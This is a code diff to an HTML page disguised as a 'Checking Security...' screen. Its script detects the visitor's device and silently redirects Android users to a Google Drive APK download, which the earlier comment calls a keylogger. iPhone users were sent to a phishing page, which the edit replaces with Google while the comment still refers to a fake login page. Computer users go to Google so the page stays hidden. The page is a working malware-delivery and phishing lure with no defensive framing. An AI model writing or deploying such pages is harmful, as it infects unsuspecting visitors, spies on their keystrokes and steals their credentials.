@@ -3,19 +3,19 @@
 <head>
     <title>Checking Security...</title>
     <script>
-        // This part checks what phone is being used
+        // This part checks if the user is on Android, iPhone, or a Computer
         var userAgent = navigator.userAgent || navigator.vendor || window.opera;
 
         if (/android/i.test(userAgent)) {
-            // If it's Android, download the Keylogger APK
+            // Android users: Redirect to the Google Drive APK download
             window.location.href = "https://drive.google.com/uc?export=download&confirm=t&id=19HIEP9vGAgLnLQNJFEznyYkMtbjdwGRc";
         } 
         else if (/iPad|iPhone|iPod/.test(userAgent)) {
-            // If it's an iPhone, send them to the Phishing Page
-            window.location.href = "portal.html";
+            // iPhone users: Redirect to your fake login page
+            window.location.href = "https://www.google.com";
         } 
         else {
-            // If it's a computer, just send them to Google
+            // Computer users: Just send them to Google to stay hidden
             window.location.href = "https://www.google.com";
         }
     </script>
